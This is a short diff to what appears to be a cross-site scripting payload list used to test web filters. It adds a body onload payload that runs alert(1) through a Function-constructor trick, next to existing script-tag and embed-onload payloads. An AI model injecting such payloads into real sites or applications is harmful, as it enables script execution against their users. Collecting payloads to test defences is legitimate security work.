@@ -2168,3 +2168,4 @@ http://www.<script>alert(1)</script .com
 /><input>
 <script>({' \ '(){alert(1)}})[` \ `]()</script>
 <embed src=URL onload=alert('xss')>
+<body onload="'use strict';throw new class extends Function{}('alert(1)')``">
